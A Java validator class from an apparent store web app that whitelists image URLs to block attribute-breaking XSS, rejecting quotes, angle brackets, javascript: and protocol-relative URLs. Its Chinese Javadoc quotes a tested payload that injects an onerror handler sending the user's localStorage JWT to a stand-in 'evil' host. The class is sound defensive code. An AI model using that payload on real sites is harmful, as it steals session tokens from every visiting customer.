package com.example.demo.common;

import com.example.demo.exception.CustomException;

import java.util.Locale;

/**
 * 圖片網址白名單（店家封面、品牌 logo、商品 logo、會員頭像）。
 *
 * <p>⚠️ 這些欄位的值會被前端直接插進 {@code <img src="...">} 或 {@code alt="..."} 的屬性裡
 * （見 {@code Customer/index.html} 的店家卡片、{@code store/js/api-home.js}）。
 * 只要值裡能塞進一個雙引號，就能跳出屬性、掛上 {@code onerror} 之類的事件處理器——
 * 實測把店家封面設成 {@code x" onerror="fetch('https://evil/?t='+localStorage.token)"}
 * 即可在**每一位造訪顧客首頁的使用者**瀏覽器上執行任意 JS，而 JWT 就存在 localStorage。
 *
 * <p>因此寫入端只接受兩種形式：
 * <ol>
 *   <li>站內相對路徑：單一 {@code /} 開頭（{@code /uploads/...}），且不得含 {@code ..}；</li>
 *   <li>絕對網址：僅 {@code http://} 與 {@code https://}（Cloudinary 走此形式）。</li>
 * </ol>
 * 其餘一律拒絕，包含 {@code javascript:}、{@code data:}、{@code blob:}、
 * 協定相對網址（{@code //evil.example/x}）以及任何引號／角括號／空白／控制字元。
 *
 * <p>這是**寫入端**的白名單，不是轉義的替代品：前端仍必須做輸出轉義，
 * 兩層缺一不可（本輪同時修了兩邊）。
 */
public final class SafeImageUrl {

    /** 合理上限：Cloudinary 產生的網址遠短於此，避免有人拿超長字串塞爆資料列 */
    private static final int MAX_LENGTH = 500;

    private SafeImageUrl() {
    }

    /**
     * @return 正規化（trim）後的安全值；輸入為 {@code null} 或空白時回傳 {@code null}
     * @throws CustomException 格式不在白名單內時
     */
    public static String normalize(String raw) {
        if (raw == null) {
            return null;
        }
        String value = raw.trim();
        if (value.isEmpty()) {
            return null;
        }
        if (value.length() > MAX_LENGTH) {
            throw reject();
        }
        for (int i = 0; i < value.length(); i++) {
            char c = value.charAt(i);
            // c <= ' ' 同時涵蓋空白、tab、換行與所有控制字元
            if (c <= ' ' || c == '"' || c == '\'' || c == '<' || c == '>' || c == '\\' || c == 0x7f) {
                throw reject();
            }
        }
        if (value.startsWith("/")) {
            // "//evil.example/x.png" 是協定相對網址，會連到外部主機
            if (value.startsWith("//") || value.contains("..")) {
                throw reject();
            }
            return value;
        }
        String lower = value.toLowerCase(Locale.ROOT);
        if (lower.startsWith("https://") || lower.startsWith("http://")) {
            String afterScheme = value.substring(value.indexOf("//") + 2);
            if (afterScheme.isEmpty() || afterScheme.startsWith("/") || afterScheme.startsWith("?")) {
                throw reject();
            }
            return value;
        }
        throw reject();
    }

    private static CustomException reject() {
        return new CustomException("400", "圖片網址格式不正確，請使用站內路徑（/uploads/...）或 http(s) 網址");
    }
}
